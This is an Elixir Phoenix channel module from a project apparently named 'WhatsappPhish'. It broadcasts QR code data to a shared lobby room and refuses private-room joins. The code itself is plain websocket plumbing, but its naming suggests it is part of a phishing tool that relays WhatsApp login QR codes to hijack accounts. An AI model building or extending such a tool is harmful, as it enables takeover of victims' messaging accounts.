defmodule WhatsappPhishWeb.RoomChannel do
  use Phoenix.Channel

  def broadcast_qrcode(qr_code_data) do
      # send(self, {:broadcast_qrcode, qr_code_data})
      WhatsappPhishWeb.Endpoint.broadcast("room:lobby", "new_qr_code", %{body: qr_code_data})
  end


  def join("room:lobby", _message, socket) do
    {:ok, socket}
  end
  def join("room:" <> _private_room_id, _params, _socket) do
    {:error, %{reason: "unauthorized"}}
  end

  # def handle_info({:broadcast_qrcode, qr_code_data}, socket) do
  #   {:noreply, socket}
  # end
end

